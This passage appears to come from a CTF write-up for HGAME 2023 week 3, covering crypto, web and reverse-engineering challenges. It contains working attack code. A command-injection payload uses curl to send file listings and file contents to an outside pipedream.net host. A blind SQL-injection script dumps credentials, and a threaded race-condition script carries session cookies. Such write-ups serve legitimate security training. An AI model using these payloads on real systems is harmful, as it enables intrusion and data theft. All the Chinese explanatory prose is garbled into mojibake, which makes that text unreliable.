class="number">6</span>: <span class="number">0x2</span>, <span class="number">7</span>: <span class="number">0xe</span>, <span class="number">8</span>: <span class="number">0x1</span>, <span class="number">9</span>: <span class="number">0xf</span>, <span class="number">10</span>: <span class="number">0x3</span>, <span class="number">11</span>: <span class="number">0xd</span>, <span class="number">12</span>: <span class="number">0x8</span>,</span><br><span class="line">             <span class="number">13</span>: <span class="number">0xa</span>, <span class="number">14</span>: <span class="number">0x9</span>, <span class="number">15</span>: <span class="number">0xb</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>):</span><br><span class="line">        t = (m &gt;&gt; i) &amp; <span class="number">0xf</span></span><br><span class="line">        t = s_box[t]</span><br><span class="line">        c += t &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">m, key</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(key)</span><br><span class="line">    t = m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">        t = t ^ key[i]</span><br><span class="line">        t = s_substitute(t)</span><br><span class="line">    c = t ^ key[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&#x27;hgame&#123;&#x27;</span> + f + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">key = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> f.split(<span class="string">&#x27;_&#x27;</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line">m_list = [i * <span class="number">0x1111</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">c_list = [enc(m, key) <span class="keyword">for</span> m <span class="keyword">in</span> m_list]</span><br><span class="line"><span class="built_in">print</span>(c_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># [28590, 33943, 30267, 5412, 11529, 3089, 46924, 59533, 12915, 37743, 64090, 53680, 18933, 49378, 23512, 44742]</span></span><br></pre></td></tr></table></figure></blockquote><p>æ­£å¸¸è€ƒç‚¹åº”è¯¥æ˜¯å››è½®Sç›’å·®åˆ†æ”»å‡»ï¼Œ<code>xxxx_xxxx_xxxx_xxxx_xxxx</code> åˆ†å‰²å¾—åˆ°5ç»„keyï¼Œæµ‹è¯•å‘ç°5ç»„keyçš„æ¯4ä½ï¼ˆæ¯1ä¸ª16è¿›åˆ¶æ•°ï¼‰ä¸ºä¸€ç»„ä½œä¸ºè¾“å…¥ï¼Œå¾—åˆ°çš„è¾“å‡ºæ˜¯å›ºå®šä¸å˜çš„ï¼Œé‡‡ç”¨çˆ†ç ´æ–¹å¼å¯è§£ï¼Œæ‰€éœ€éå†æ¬¡æ•°ä¸º $4 \cdot 16^5=4194304$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">m = [i * <span class="number">0x1111</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">c = [<span class="number">28590</span>, <span class="number">33943</span>, <span class="number">30267</span>, <span class="number">5412</span>, <span class="number">11529</span>, <span class="number">3089</span>, <span class="number">46924</span>, <span class="number">59533</span>, <span class="number">12915</span>, <span class="number">37743</span>, <span class="number">64090</span>, <span class="number">53680</span>, <span class="number">18933</span>, <span class="number">49378</span>, <span class="number">23512</span>, <span class="number">44742</span>]</span><br><span class="line">m = [[(k &gt;&gt; i) &amp; <span class="number">0xf</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)] <span class="keyword">for</span> k <span class="keyword">in</span> m]</span><br><span class="line">c = [[(k &gt;&gt; i) &amp; <span class="number">0xf</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)] <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line"><span class="comment">#print(c)</span></span><br><span class="line"></span><br><span class="line">m = [[k[i] <span class="keyword">for</span> k <span class="keyword">in</span> m] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">c = [[k[i] <span class="keyword">for</span> k <span class="keyword">in</span> c] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s_substitute</span>(<span class="params">m</span>):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    s_box = &#123;<span class="number">0</span>: <span class="number">0x6</span>, <span class="number">1</span>: <span class="number">0x4</span>, <span class="number">2</span>: <span class="number">0xc</span>, <span class="number">3</span>: <span class="number">0x5</span>, <span class="number">4</span>: <span class="number">0x0</span>, <span class="number">5</span>: <span class="number">0x7</span>, <span class="number">6</span>: <span class="number">0x2</span>, <span class="number">7</span>: <span class="number">0xe</span>, <span class="number">8</span>: <span class="number">0x1</span>, <span class="number">9</span>: <span class="number">0xf</span>, <span class="number">10</span>: <span class="number">0x3</span>, <span class="number">11</span>: <span class="number">0xd</span>, <span class="number">12</span>: <span class="number">0x8</span>,</span><br><span class="line">             <span class="number">13</span>: <span class="number">0xa</span>, <span class="number">14</span>: <span class="number">0x9</span>, <span class="number">15</span>: <span class="number">0xb</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>):</span><br><span class="line">        t = (m &gt;&gt; i) &amp; <span class="number">0xf</span></span><br><span class="line">        t = s_box[t]</span><br><span class="line">        c += t &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">m, key</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(key)</span><br><span class="line">    t = m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">        t = t ^ key[i]</span><br><span class="line">        t = s_substitute(t)</span><br><span class="line">    c = t ^ key[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">m_list = [i * <span class="number">0x1111</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">finalkey = [<span class="string">&#x27;&#x27;</span>]*<span class="number">5</span></span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">allc = <span class="built_in">list</span>(product(dic,repeat=<span class="number">5</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> tqdm(allc):</span><br><span class="line">        key = [(<span class="built_in">int</span>(x, <span class="number">16</span>))&lt;&lt;(<span class="number">4</span>*i) <span class="keyword">for</span> x <span class="keyword">in</span> k]</span><br><span class="line">        c_list = [enc(m, key) <span class="keyword">for</span> m <span class="keyword">in</span> m_list]</span><br><span class="line">        out = [(k &gt;&gt; (<span class="number">4</span>*i)) &amp; <span class="number">0xf</span> <span class="keyword">for</span> k <span class="keyword">in</span> c_list]</span><br><span class="line">        <span class="keyword">if</span> out == c[i]:</span><br><span class="line">            <span class="built_in">print</span>(i,k)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                finalkey[j] = k[j] + finalkey[j]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hgame&#123;&#x27;</span>+<span class="string">&#x27;_&#x27;</span>.join(finalkey)+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0 (&#x27;2&#x27;, &#x27;3&#x27;, &#x27;2&#x27;, &#x27;0&#x27;, &#x27;5&#x27;)</span></span><br><span class="line"><span class="comment"># 1 (&#x27;4&#x27;, &#x27;9&#x27;, &#x27;9&#x27;, &#x27;7&#x27;, &#x27;d&#x27;)</span></span><br><span class="line"><span class="comment"># 2 (&#x27;f&#x27;, &#x27;4&#x27;, &#x27;f&#x27;, &#x27;5&#x27;, &#x27;8&#x27;)</span></span><br><span class="line"><span class="comment"># 3 (&#x27;4&#x27;, &#x27;f&#x27;, &#x27;4&#x27;, &#x27;4&#x27;, &#x27;d&#x27;)</span></span><br><span class="line"><span class="comment"># hgame&#123;4f42_f493_4f92_4570_d8d5&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ping-To-The-Host"><a href="#Ping-To-The-Host" class="headerlink" title="Ping To The Host"></a>Ping To The Host</h3><blockquote><p>ä¸€ä¸ªç”¨æ¥è¾“å…¥ipçš„pingå·¥å…·ï¼Œæˆ‘å¯ä»¥ç”¨å®ƒæ¥åšäº›ä»€ä¹ˆï¼Ÿ</p></blockquote><p>æ— å›æ˜¾å‘½ä»¤æ³¨å…¥ï¼Œå¤–å¸¦å³å¯ã€‚ç©ºæ ¼ä½¿ç”¨ <code>$IFS$9</code> ç»•è¿‡ã€‚</p><p>åˆ—ç›®å½•ï¼š<code>ip=x|curl$IFS$9https://enm8badfmuo0f.x.pipedream.net/?p=`ls$IFS$9/|base64` </code>ï¼Œå¾—åˆ°flagæ–‡ä»¶åä¸º <code>flag_is_here_haha</code>ï¼›</p><p>è¯»æ–‡ä»¶ï¼š<code>ip=x|curl$IFS$9https://enm8badfmuo0f.x.pipedream.net/?p=`uniq$IFS$9/f*|base64` </code>ï¼Œå¾—åˆ° <code>aGdhbWV7cDFuR190MF9Db21NNG5EX0V4ZWNVdDFvbl9kQW5nRXJSclJyUnJSIX0K</code>ï¼Œbase64è§£ç å¾— <code>hgame&#123;p1nG_t0_ComM4nD_ExecUt1on_dAngErRrRrRrR!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Login-To-Get-My-Gift"><a href="#Login-To-Get-My-Gift" class="headerlink" title="Login To Get My Gift"></a>Login To Get My Gift</h3><blockquote><p>R1esbyfeï¼šâ€œæƒ³å¿…ä½ ä¸Šå‘¨å·²ç»æ‰¾åˆ°äº†æˆ‘ç•™ç»™ä½ çš„æƒŠå–œï¼Œè¿™æ¬¡æˆ‘åˆè—äº†ä¸€ä¸ªâ€ </p><p>å…”å…”æƒ³èµ·äº†ä¸Šå‘¨R1esbyfeå­¦é•¿æ•™çš„sqlåŸºç¡€çŸ¥è¯†ä¸è¿ç”¨æ–¹æ³•ï¼Œæ˜¯æ—¶å€™å°†ä»–ä»¬æ´¾ä¸Šç”¨åœºäº† </p><p>R1esbyfeï¼šâ€œç»™ä½ ä¸ªç”¨æˆ·åä¸ºtestuserï¼Œå¯†ç ä¸ºtestpasswordçš„testè´¦æˆ·å§ï¼Œä¸è¿‡åªæœ‰çœŸæ­£çš„ç®¡ç†å‘˜æ‰èƒ½å¾—åˆ°æƒŠå–œ:D åˆ«æƒ³äº†ï¼Œç®¡ç†å‘˜ç”¨æˆ·åå¯ä¸æ˜¯adminâ€</p><p>After login, you can visit: </p><p>/index -&gt; Only for test users </p><p>/home -&gt; Only for admin users</p></blockquote><p>fuzzæµ‹è¯•ï¼Œå‘ç°è¿‡æ»¤äº†ç©ºæ ¼ã€ç­‰å·ã€substrã€midç­‰ï¼Œç­‰å·ç”¨ <code>regexp</code> ç»•è¿‡ï¼Œ<code>substr()</code> ç”¨ <code>right(left())</code> ç»•è¿‡æ¥å–å­—ç¬¦ã€‚å¸ƒå°”ç›²æ³¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://week-3.hgame.lwsec.cn:31673/login&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;if(ascii(right(left((select(database())),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;if(ascii(right(left((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(&quot;L0g1NMe&quot;))),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;if(ascii(right(left((select(group_concat(column_name))from(information_schema.columns)where((table_schema)regexp(&quot;L0g1NMe&quot;))),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(right(left((select(group_concat(PAssw0rD,&quot;~&quot;,UsErN4me))from(L0g1NMe.User1nf0mAt1on)),<span class="subst">&#123;i&#125;</span>),1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;testuser&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">f&quot;1&#x27;^(<span class="subst">&#123;payload&#125;</span>)^&#x27;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Success!&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>åˆ†åˆ«å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">database: L0g1NMe</span><br><span class="line">table: User1nf0mAt1on</span><br><span class="line">column: id,PAssw0rD,UsErN4me</span><br><span class="line">flag: WeLc0meT0hgAmE2023~hAPPySqlhgAmE2023HAppYnEwyEAr,testpassword~testuser</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è´¦å¯† <code>WeLc0meT0hgAmE2023/hAPPySqlhgAmE2023HAppYnEwyEAr</code> ç™»å½•ï¼Œå¾—flagï¼š<code>hgame&#123;It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Gopher-Shop"><a href="#Gopher-Shop" class="headerlink" title="Gopher Shop"></a>Gopher Shop</h3><blockquote><p>ä»Šå¤©æ˜¯å¤§å¹´åˆäºŒï¼å…”å…”è¿ˆç€å¼€å¿ƒçš„æ­¥ä¼èµ°åˆ°äº†ä¸€æ•™ï¼Œæ®è¯´æ¯é€¢å¯’å‡HGAMEæœŸé—´ï¼Œ300bå°±ä¼šæœ‰Vidarå¤§å•†åœºï¼Œæ¯ä¸ªè¿›å…¥å•†åœºçš„åŒå­¦éƒ½å¯ä»¥é¢†å–10ä¸ªVidarå¸ã€‚å…”å…”åœ¨ä¸€å®¶å«Gopher Shopçš„å•†åº—é¢å‰åœä¸‹äº†è„šæ­¥ï¼ŒGopherï¼Ÿå¬è¯´åä¼šçš„Webæ‰‹ä»¬éƒ½ä¼šä¸€ç‚¹Go,ä¹Ÿè®¸è¿™æ˜¯åä¼šå­¦é•¿å¼€çš„å§ã€‚æœ›ç€æ©±çª—é‡Œçš„å•†å“ï¼Œæ”¥ç€æ‰‹é‡Œçš„10ä¸ªVidarå¸ï¼Œå…”å…”èµ°è¿›äº†å•†åº—â€¦</p></blockquote><p>åœ¨ <code>/buyProduct</code> è·¯ç”±å¤„åˆ©ç”¨ç«äº‰ä¹°flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://week-3.hgame.lwsec.cn:30875/api/v1/user/buyProduct?product=Flag&amp;number=1&#x27;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;SESSION=MTY3NDQ5MTUzNHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBY0FCV0ZrYldsdXz3P-nsnRLwqBHiy3dxz3pgu8nGGORBOuHQaWl7ObqsvQ==; session=MTY3NDc0MzkzM3xEdi1CQkFFQ180SUFBUkFCRUFBQUpmLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dGQUFOaFlXRT18psiHGgZdURTbYwyW0lTiIA-D7mS0kxe9mu-kLSib2NI=&#x27;</span>&#125;</span><br><span class="line">    r = requests.get(url=url, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    threading.Thread(target=req).start()</span><br></pre></td></tr></table></figure><p>æœ€åç‚¹å‡»checkflagå¾—åˆ°flagï¼š<code>hgame&#123;GopherShop_M@gic_1nt_0verflow&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="kunmusic"><a href="#kunmusic" class="headerlink" title="kunmusic"></a>kunmusic</h3><blockquote><p>å°é»‘å­ï¼Œéœ²å‡ºé¸¡è„šäº†å§ï¼Ÿ</p></blockquote><p>kmusic.dllä¸º.NETç¨‹åºï¼ŒILSpyæ‰“å¼€ï¼Œåœ¨ <code>Program</code> ç±»æ‰¾åˆ°ç±»ä¼¼SMCåè°ƒè¯•çš„å¼‚æˆ–æ“ä½œï¼š</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"><span class="keyword">using</span> kmusic;</span><br><span class="line"><span class="keyword">using</span> kmusic.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Form1 form1 = <span class="keyword">new</span> Form1();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">ApplicationConfiguration.Initialize();</span><br><span class="line"><span class="built_in">byte</span>[] data = Resources.data;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; data.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">data[i] ^= <span class="number">104</span>;</span><br><span class="line">&#125;</span><br><span class="line">Activator.CreateInstance(Assembly.Load(data).GetType(<span class="string">&quot;WinFormsLibrary1.Class1&quot;</span>), form1);</span><br><span class="line">Application.Run((Form)(<span class="built_in">object</span>)form1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨èµ„æºéƒ¨åˆ†æ‰¾åˆ° <code>Resources.data</code>ï¼Œå¯¼å‡ºï¼Œå¼‚æˆ–104è¿˜åŸå‡ºå¦ä¸€ä¸ª.NETç¨‹åºï¼Œåœ¨ <code>Class1</code> ç±»ä¸­æ‰¾åˆ°å…³é”®é€»è¾‘ï¼š</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Media;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"><span class="keyword">using</span> kmusic;</span><br><span class="line"><span class="keyword">using</span> kmusic.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Class1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">int</span>[] num = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">13</span>];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">music</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//IL_0ade: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_0ae9: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="keyword">if</span> (num[<span class="number">0</span>] + <span class="number">52296</span> + num[<span class="number">1</span>] - <span class="number">26211</span> + num[<span class="number">2</span>] - <span class="number">11754</span> + (num[<span class="number">3</span>] ^ <span class="number">0xA114</span>) + num[<span class="number">4</span>] * <span class="number">63747</span> + num[<span class="number">5</span>] - <span class="number">52714</span> + num[<span class="number">6</span>] - <span class="number">10512</span> + num[<span class="number">7</span>] * <span class="number">12972</span> + num[<span class="number">8</span>] + <span class="number">45505</span> + num[<span class="number">9</span>] - <span class="number">21713</span> + num[<span class="number">10</span>] - <span class="number">59122</span> + num[<span class="number">11</span>] - <span class="number">12840</span> + (num[<span class="number">12</span>] ^ <span class="number">0x525F</span>) == <span class="number">12702282</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">25228</span> + (num[<span class="number">1</span>] ^ <span class="number">0x50DB</span>) + (num[<span class="number">2</span>] ^ <span class="number">0x1FDE</span>) + num[<span class="number">3</span>] - <span class="number">65307</span> + num[<span class="number">4</span>] * <span class="number">30701</span> + num[<span class="number">5</span>] * <span class="number">47555</span> + num[<span class="number">6</span>] - <span class="number">2557</span> + (num[<span class="number">7</span>] ^ <span class="number">0xBF9F</span>) + num[<span class="number">8</span>] - <span class="number">7992</span> + (num[<span class="number">9</span>] ^ <span class="number">0xE079</span>) + (num[<span class="number">10</span>] ^ <span class="number">0xE052</span>) + num[<span class="number">11</span>] + <span class="number">13299</span> + num[<span class="number">12</span>] - <span class="number">50966</span> == <span class="number">9946829</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">64801</span> + num[<span class="number">1</span>] - <span class="number">60698</span> + num[<span class="number">2</span>] - <span class="number">40853</span> + num[<span class="number">3</span>] - <span class="number">54907</span> + num[<span class="number">4</span>] + <span class="number">29882</span> + (num[<span class="number">5</span>] ^ <span class="number">0x3506</span>) + (num[<span class="number">6</span>] ^ <span class="number">0x533E</span>) + num[<span class="number">7</span>] + <span class="number">47366</span> + num[<span class="number">8</span>] + <span class="number">41784</span> + (num[<span class="number">9</span>] ^ <span class="number">0xD1BA</span>) + num[<span class="number">10</span>] * <span class="number">58436</span> + num[<span class="number">11</span>] * <span class="number">15590</span> + num[<span class="number">12</span>] + <span class="number">58225</span> == <span class="number">2372055</span> &amp;&amp; num[<span class="number">0</span>] + <span class="number">61538</span> + num[<span class="number">1</span>] - <span class="number">17121</span> + num[<span class="number">2</span>] - <span class="number">58124</span> + num[<span class="number">3</span>] + <span class="number">8186</span> + num[<span class="number">4</span>] + <span class="number">21253</span> + num[<span class="number">5</span>] - <span class="number">38524</span> + num[<span class="number">6</span>] - <span class="number">48323</span> + num[<span class="number">7</span>] - <span class="number">20556</span> + num[<span class="number">8</span>] * <span class="number">56056</span> + num[<span class="number">9</span>] + <span class="number">18568</span> + num[<span class="number">10</span>] + <span class="number">12995</span> + (num[<span class="number">11</span>] ^ <span class="number">0x995C</span>) + num[<span class="number">12</span>] + <span class="number">25329</span> == <span class="number">6732474</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">42567</span> + num[<span class="number">1</span>] - <span class="number">17743</span> + num[<span class="number">2</span>] * <span class="number">47827</span> + num[<span class="number">3</span>] - <span class="number">10246</span> + (num[<span class="number">4</span>] ^ <span class="number">0x3F9C</span>) + num[<span class="number">5</span>] + <span class="number">39390</span> + num[<span class="number">6</span>] * <span class="number">11803</span> + num[<span class="number">7</span>] * <span class="number">60332</span> + (num[<span class="number">8</span>] ^ <span class="number">0x483B</span>) + (num[<span class="number">9</span>] ^ <span 